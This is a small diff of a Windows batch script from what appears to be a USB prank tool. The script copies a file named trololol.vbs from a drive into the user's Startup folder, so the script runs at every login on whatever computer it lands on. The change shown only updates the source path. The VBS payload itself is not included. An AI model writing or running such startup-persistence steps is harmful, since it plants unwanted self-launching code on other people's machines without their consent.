@@ -1,7 +1,7 @@
 C:
 cd %appdata%
 cd "Microsoft\Windows\Start Menu\Programs\Startup"
-copy Q:\Owner\info\trololol.vbs
+copy Q:\USB-Troll-main\Troll\trololol.vbs
 
 
 Q:
